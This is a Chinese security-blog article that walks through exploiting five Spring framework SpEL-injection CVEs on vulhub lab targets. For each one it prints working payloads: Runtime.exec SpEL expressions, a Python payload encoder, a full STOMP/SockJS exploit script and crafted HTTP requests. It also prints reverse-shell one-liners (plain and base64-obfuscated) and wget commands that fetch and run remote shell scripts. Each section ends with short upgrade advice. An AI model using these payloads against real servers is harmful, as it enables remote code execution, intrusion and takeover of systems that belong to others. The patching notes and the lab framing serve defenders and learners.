#  【干货】Spring框架漏洞渗透总结

[ 渗透Xiao白帽 ](javascript:void\(0\);)

**渗透Xiao白帽** ![]()

微信号 SuPejkj

功能介绍 积硅步以致千里，积怠惰以致深渊！

____

__

收录于话题 #主流漏洞总结 ,1个

##

> 文章来源：亿人安全

Spring简介

Spring是Java EE编程领域的一个轻量级开源框架，该框架由一个叫Rod
Johnson的程序员在2002年最早提出并随后创建，是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为J2EE应用程序开发提供集成的框架。

2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression
Language)。类比Struts2框架，会发现绝大部分的安全漏洞都和OGNL脱不了干系。尤其是远程命令执行漏洞，这导致Struts2越来越不受待见。

因此，Spring引入SpEL必然增加安全风险。事实上，过去多个Spring
CVE都与其相关，如CVE-2017-8039、CVE-2017-4971、CVE-2016-5007、CVE-2016-4977等。

SpEL是什么

SpEL(Spring Expression
Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。

SpEL原理如下∶

  1. 表达式:可以认为就是传入的字符串内容
  2. 解析器︰将字符串解析为表达式内容
  3. 上下文:表达式对象执行的环境
  4. 根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象

参考链接：http://rui0.cn/archives/1043

## Spring框架特征

1.看web应用程序的ico小图标，是一个小绿叶子

![](https://gitee.com/fuli009/images/raw/master/public/20210903082953.png)image-20210830095238341

2.看报错页面，如果默认报错页面没有修复，那就是长这样

![](https://gitee.com/fuli009/images/raw/master/public/20210903082954.png)image-20210830095328827

3.wappalyzer插件识别

![](https://gitee.com/fuli009/images/raw/master/public/20210903082955.png)

4.f12看X-Application-Context头

![](https://gitee.com/fuli009/images/raw/master/public/20210903082956.png)

## 本地环境搭建

### 安装IDEA

官网下载安装包 ：https://www.jetbrains.com/idea/download/#section=windows

这里选择得商业版，免费试用30天

![](https://gitee.com/fuli009/images/raw/master/public/20210903082959.png)1111![](https://gitee.com/fuli009/images/raw/master/public/20210903083000.png)image-20210829150233085

安装目录默认

![](https://gitee.com/fuli009/images/raw/master/public/20210903083002.png)image-20210829150403552

报错不用管，点击确认，一直默认下一步

![](https://gitee.com/fuli009/images/raw/master/public/20210903083003.png)image-20210829150438103

双击下图图标

![](https://gitee.com/fuli009/images/raw/master/public/20210903083004.png)image-20210829150723616![](https://gitee.com/fuli009/images/raw/master/public/20210903083005.png)image-20210829150816862![](https://gitee.com/fuli009/images/raw/master/public/20210903083006.png)image-20210829150911247![](https://gitee.com/fuli009/images/raw/master/public/20210903083007.png)image-20210829150927153![](https://gitee.com/fuli009/images/raw/master/public/20210903083008.png)image-20210829152308559![](https://gitee.com/fuli009/images/raw/master/public/20210903083010.png)image-20210829152347602![](https://gitee.com/fuli009/images/raw/master/public/20210903083011.png)image-20210829152445317

选择Download SDK

![](https://gitee.com/fuli009/images/raw/master/public/20210903083012.png)image-20210829152515464

选择jdk1.8

![](https://gitee.com/fuli009/images/raw/master/public/20210903083015.png)image-20210829160411559![]()image-20210829160428309![](https://gitee.com/fuli009/images/raw/master/public/20210903083016.png)image-20210829153041039

点next

![](https://gitee.com/fuli009/images/raw/master/public/20210903083017.png)image-20210829160213693

点击Spring Web

![](https://gitee.com/fuli009/images/raw/master/public/20210903083018.png)image-20210829160555701

等待安装

![](https://gitee.com/fuli009/images/raw/master/public/20210903083020.png)image-20210829161052043

点击右上角启动，可以看见默认端口8080

![](https://gitee.com/fuli009/images/raw/master/public/20210903083021.png)

成功访问，部署成功

![](https://gitee.com/fuli009/images/raw/master/public/20210903083023.png)image-20210829162247520

这里复现的环境搭建均采用p牛的vulhub靶场环境。

## Spring渗透总结

### 1.Spring Security OAuth2 远程命令执行（CVE-2016-4977）

#### 漏洞简介

Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块。Spring Security
OAuth2处理认证请求的时候如果使用了whitelabel views，response_type参数值会被当做Spring
SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。

#### 影响版本

    
    
    2.0.0-2.0.9  
    1.0.0-1.0.5  
    

#### 漏洞验证

启动漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20210903083024.png)image-20210829172348141

访问url

![](https://gitee.com/fuli009/images/raw/master/public/20210903083025.png)

输入下面的漏洞测试url：

    
    
    http://192.168.173.144:8080/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test  
    

访问后会弹窗，输入用户名和密码 admin:admin即可，返回结果可以看到值被成功计算为2*2=4

![](https://gitee.com/fuli009/images/raw/master/public/20210903083026.png)![](https://gitee.com/fuli009/images/raw/master/public/20210903083027.png)

页面返回执行了我们输入的SpEL表达式，这里可以看作是SpEL表达式的注入，既然表达式被执行了，我们可以考虑代码注入的可能性。

#### 漏洞复现

这里看一下vulhub提供的poc，poc地址：https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py

    
    
    #!/usr/bin/env python  
    message = input('Enter message to encode:')  
    poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])  
    for ch in message[1:]:  
       poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)   
    poc += ')}'  
    print(poc)  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083029.png)image-20210829191932279

可以看出该poc对输入的命令进行了变形，将命令的每个字符串转化为ASCII码配合tostring()方法并且用concat拼接传入exec执行。

反弹shell：

对于poc需要先进行base64编码(java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符,重定向，空格，管道符都有可能造成错误，具体可以参考这篇文章：https://blog.th3wind.xyz/posts/238052750.html）

在线生成有效载荷的网站：http://www.jackson-t.ca/runtime-exec-payloads.html

    
    
    bash -i >& /dev/tcp/192.168.173.133/1234 0>&1  
      
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083030.png)image-20210829191700097

生成poc

    
    
    ${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}  
      
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083031.png)image-20210829191855899

修改后的url：

    
    
    http://192.168.173.144:8080/oauth/authorize?response_type=${poc的位置}&client_id=acme&scope=openid&redirect_uri=http://test  
    
    
    
    http://192.168.173.144:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test  
    

监听端口：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083033.png)image-20210829192032257

执行url，看见如图的显示页面说明已成功执行：

![]()![](https://gitee.com/fuli009/images/raw/master/public/20210903083034.png)image-20210829195130626

反弹shell成功。

#### 安全防护

1．使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel这个视图。2．使用2.0.x版本的用户升级到2.0.10以及更高的版本

因为对java不是很熟，所以没有对底层原理进行分析，但是发现一篇文章分析的还是蛮好的，大家可以看一下：https://blog.knownsec.com/2016/10/spring-
security-oauth-rce/

### 2.Spring Web Flow框架远程代码执行(CVE-2017-4971)

#### 漏洞简介

Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。

Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x
版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。

#### 影响版本

    
    
    Spring WebFlow 2.4.0 - 2.4.4  
    

#### 触发条件

  1. MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）

  2. flow view对象中设置BinderConfiguration对象为空

#### 漏洞复现

开启漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20210903083035.png)image-20210829203741029![](https://gitee.com/fuli009/images/raw/master/public/20210903083037.png)image-20210829203746016

点击login

![](https://gitee.com/fuli009/images/raw/master/public/20210903083038.png)image-20210829203825199

可以看见这里有很多默认的用户名密码，随便选一组登录系统

![](https://gitee.com/fuli009/images/raw/master/public/20210903083040.png)image-20210829203850907

然后访问id为1的酒店地址：

    
    
    http://192.168.173.144:8080/hotels/1  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083041.png)image-20210829204104888

点击预订按钮”Book Hotel"，填写相关信息后点击“ Process”(从这一步，其实WebFlow就正式开始了)︰

![](https://gitee.com/fuli009/images/raw/master/public/20210903083042.png)image-20210829204232794

随便输入一些内容后，我们点击Proceed然后会跳转到Confirm页面（Credit Card为16位）：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083043.png)

点击confirm时进行抓包

![](https://gitee.com/fuli009/images/raw/master/public/20210903083044.png)image-20210829204401161![](https://gitee.com/fuli009/images/raw/master/public/20210903083045.png)image-20210829204731522

反弹shell的poc：

    
    
    原POC:  
    &_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/192.168.173.133/1234 0>&1")).start()=vulhub  
      
    URL编码后  
    &_(new java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.173.133/1234 0>%261")).start()=vulhub  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083046.png)image-20210829210014751

exp扩展

> 1、向里面写入文件
>  
>  
>     &_T(java.lang.Runtime).getRuntime().exec("touch /tmp/zcc")  
>     >
>
>
> ![](https://gitee.com/fuli009/images/raw/master/public/20210903083047.png)image-20210829211034218![](https://gitee.com/fuli009/images/raw/master/public/20210903083048.png)image-20210829211128104

> 2、使用wget下载远程bash脚本
>  
>  
>     &_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/shell
> http://x.x.x.x:xxxx/shell")  
>     >

> 3、执行上一步下载的脚本
>  
>  
>     &_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/shell")  
>     >

#### 安全防护

官方已经发布了新版本，请受影响的用户及时更新升级至最新的版本来防护该漏洞。官方同时建议用户应该更改数据绑定的默认设置来确保提交的表单信息符合要求来规避类似恶意行为。参考链接:

>  **https://pivotal.io/security/cve-2017-4971**

对于这个漏洞的底层分析文章，大家可以看看这篇：https://paper.seebug.org/322/

### 3.Spring Data Rest远程命令执行命令(CVE-2017-8046)

#### 漏洞简介

Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-
rest服务器，通过构造好的JSON数据来执行任意Java代码。

#### 影响版本

    
    
    Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3  
    Spring Boot version < 2.0.0M4  
    Spring Data release trains < Kay-RC3  
    

#### 漏洞验证

开启漏洞环境：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083049.png)image-20210829212225888![](https://gitee.com/fuli009/images/raw/master/public/20210903083050.png)image-20210829212307609

看到 json格式的返回值，说明这是一个 Restful风格的API服务器。

访问如下url，如果有下面回显，则说明存在该漏洞：

    
    
    http://192.168.173.144:8080/customers/1  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083051.png)image-20210829212445500

#### 漏洞复现

bp抓包，并且使用PATCH请求来修改：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083052.png)image-20210829213412995

创建文件touch /tmp/zcc的poc，需要对其进行十进制编码：

    
    
    ",".join(map(str, (map(ord,"touch /tmp/zcc"))))  
      
    '116,111,117,99,104,32,47,116,109,112,47,122,99,99'  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083054.png)image-20210829213806596

将该编码写入poc，放入请求包，注意json格式的poc上面留一个空行，Content-Type: 为application/json-patch+json

    
    
    PATCH /customers/1 HTTP/1.1  
    Host: localhost:8080  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Accept-Language: en  
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)  
    Connection: close  
    Content-Type: application/json-patch+json  
    Content-Length: 201  
      
    [  
     { "op": "replace",   
       "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,122,99,99}))/lastname",  
       "value": "vulhub"   
     }  
    ]  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083055.png)

成功写入：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083056.png)image-20210829214306623

反弹shell的poc，先进行base64编码：

    
    
    bash -i >& /dev/tcp/192.168.173.1234/8888 0>&1  
      
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}  
      
      
    98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,77,121,52,120,77,122,77,118,77,84,73,122,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083057.png)image-20210829214750387![](https://gitee.com/fuli009/images/raw/master/public/20210903083058.png)image-20210829214929261

写入poc，成功反弹。

#### 安全防护

升级到以下最新版本：* Spring Data REST 2.5.12, 2.6.7, 3.0 RC3 * Spring Boot 2.0.0.M4 *
Spring Data release train Kay-RC3

对于该漏洞底层原理分析的文章可以参考这一篇：https://blog.spoock.com/2018/05/22/cve-2017-8046/

### 4.Spring Messaging远程命令执行突破(CVE-2018-1270)

#### 漏洞简介

spring
messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring
messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。

#### 影响版本

    
    
    Spring Framework 5.0 - 5.0.5  
    Spring Framework 4.3 - 4.3.15  
    已不支持的旧版本仍然受影响  
    

#### 漏洞验证

开启漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20210903083059.png)image-20210829215634535![](https://gitee.com/fuli009/images/raw/master/public/20210903083100.png)image-20210829215721412

访问该页面：

    
    
    http://192.168.173.144:8080/gs-guide-websocket  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083101.png)image-20210829220006857

#### 漏洞复现

对反弹shell的命令base64编码：

    
    
    bash -i >& /dev/tcp/192.168.173.133/1234 0>&1  
      
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}  
    

创建exp.py,自行修改ip和命令语句：

    
    
    #!/usr/bin/env python3  
    import requests  
    import random  
    import string  
    import time  
    import threading  
    import logging  
    import sys  
    import json  
      
    logging.basicConfig(stream=sys.stdout, level=logging.INFO)  
      
    def random_str(length):  
        letters = string.ascii_lowercase + string.digits  
        return ''.join(random.choice(letters) for c in range(length))  
      
      
    class SockJS(threading.Thread):  
        def __init__(self, url, *args, **kwargs):  
            super().__init__(*args, **kwargs)  
            self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'  
            self.daemon = True  
            self.session = requests.session()  
            self.session.headers = {  
                'Referer': url,  
                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'  
            }  
            self.t = int(time.time()*1000)  
      
        def run(self):  
            url = f'{self.base}/htmlfile?c=_jp.vulhub'  
            response = self.session.get(url, stream=True)  
            for line in response.iter_lines():  
                time.sleep(0.5)  
          
        def send(self, command, headers, body=''):  
            data = [command.upper(), '\n']  
      
            data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))  
              
            data.append('\n\n')  
            data.append(body)  
            data.append('\x00')  
            data = json.dumps([''.join(data)])  
      
            response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)  
            if response.status_code != 204:  
                logging.info(f"send '{command}' data error.")  
            else:  
                logging.info(f"send '{command}' data success.")  
      
        def __del__(self):  
            self.session.close()  
      
      
    sockjs = SockJS('http://192.168.173.144:8080/gs-guide-websocket')  
    sockjs.start()  
    time.sleep(1)  
      
    sockjs.send('connect', {  
        'accept-version': '1.1,1.0',  
        'heart-beat': '10000,10000'  
    })  
    sockjs.send('subscribe', {  
        'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3My4xMzMvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}')",  
        'id': 'sub-0',  
        'destination': '/topic/greetings'  
    })  
      
    data = json.dumps({'name': 'vulhub'})  
    sockjs.send('send', {  
        'content-length': len(data),  
        'destination': '/app/hello'  
    }, data)  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083102.png)image-20210829220649484![](https://gitee.com/fuli009/images/raw/master/public/20210903083103.png)image-20210829220854352

成功反弹。

#### 安全防护

1.请升级Spring框架到最新版本(5.0.5、4.3.15及以上版本);

2.如果你在用 SpringBoot，请升级到最新版本(2.0.1及以上版本);

对于底层原理进行分析的文章可以参考这一篇：https://paper.seebug.org/562/

### 5.Spring Data Commons远程命令执行漏洞(CVE-2018-1273)

#### 漏洞简介

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring
Data下所有子项目共享的基础框架。Spring Data Commons
在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

#### 影响版本

    
    
    Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)  
    Spring Data REST 2.6 – 2.6.10(Ingalls SR10)  
    Spring Data Commons 2.0 – 2.0.5 (Kay SR5)  
    Spring Data REST 3.0 – 3.0.5(Kay SR5)  
    官方已经不支持的旧版本  
    

#### 漏洞验证

启动漏洞

![](https://gitee.com/fuli009/images/raw/master/public/20210903083104.png)image-20210829221718475![](https://gitee.com/fuli009/images/raw/master/public/20210903083106.png)image-20210829221818001

#### 漏洞复现

访问该url，bp抓包

    
    
    http://192.168.173.144:8080/users  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083108.png)image-20210829221903184![](https://gitee.com/fuli009/images/raw/master/public/20210903083109.png)image-20210829222003810

加上poc的请求包如下：

    
    
    POST /users?page=&size=5 HTTP/1.1  
    Host: 192.168.173.144:8080  
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
    Accept-Language: en-US,en;q=0.5  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 120  
    Origin: http://192.168.173.144:8080  
    Connection: close  
    Referer: http://192.168.173.144:8080/users  
    Cookie: JSESSIONID=F773DEBD35D866E11D6753373652513C  
    Upgrade-Insecure-Requests: 1  
      
      
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/zcc")]=&password=&repeatedPassword=  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083110.png)image-20210829222834353![](https://gitee.com/fuli009/images/raw/master/public/20210903083111.png)image-20210829222911752

成功写入。

反弹shell：

写一个shell.sh文件，开启http服务：

![](https://gitee.com/fuli009/images/raw/master/public/20210903083112.png)image-20210829223228384![](https://gitee.com/fuli009/images/raw/master/public/20210903083113.png)image-20210829223331882

下载执行sh脚本：

    
    
    /usr/bin/wget -qO /tmp/shell.sh http://192.168.173.131/shell.sh  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083114.png)image-20210829223703018![](https://gitee.com/fuli009/images/raw/master/public/20210903083115.png)image-20210829223713495![](https://gitee.com/fuli009/images/raw/master/public/20210903083116.png)image-20210829223749707

执行shell.sh

    
    
    /bin/bash /tmp/shell.sh  
    

![](https://gitee.com/fuli009/images/raw/master/public/20210903083117.png)image-20210829223919181

成功反弹。

#### 安全防护

  1. 受影响版本的用户应该应用以下缓解措施：

  * 2.0.x用户应该升级到2.0.6
  * 1.13.x用户应该升级到1.13.11
  * 旧版本应升级到受支持的分支

已解决此问题的发布版本包括：

  * Spring Data REST 2.6.11（Ingalls SR11）
  * Spring Data REST 3.0.6（Kay SR6）
  * Spring Boot 1.5.11
  * Spring Boot 2.0.1

  1. 使用Spring Security提供的身份验证和授权，限定特定访问。

对于该漏洞的底层原理分析可以看该文章：https://www.cnblogs.com/hac425/p/9656747.html

 **【往期推荐】**  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-Shellcode
Loader原理(python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS免杀-
分离+混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细 | 钟馗之眼】ZoomEye-
